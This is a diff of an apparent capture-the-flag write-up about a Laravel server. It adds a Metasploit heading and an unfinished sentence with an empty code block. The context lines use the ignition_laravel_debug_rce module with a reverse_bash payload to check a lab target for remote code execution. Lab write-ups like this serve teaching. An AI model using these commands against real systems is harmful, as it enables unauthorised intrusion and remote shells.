@@ -134,6 +134,8 @@ MAC Address: 02:C2:4A:6E:C9:01 (Unknown)
 Now we can see that the server is running Laravel (Common Web Application development framework).
 The application may be vulnerable to a remote code execution exploit. We can use Metasploit to verify it.
 
+## Metasploit
+
 ```Metasploit Commands
 msf6 > use multi/php/ignition_laravel_debug_rce
 [*] Using configured payload cmd/unix/reverse_bash
@@ -144,3 +146,7 @@ msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=10.10.40.65 Htt
 ```
 
 [//]: Set `HttpClientTimeout=20` or check may fail. If the connection is really slow/unstable, you may need a higher value.
+
+Now that we now that the target is vulnerable, lets 
+```
+```
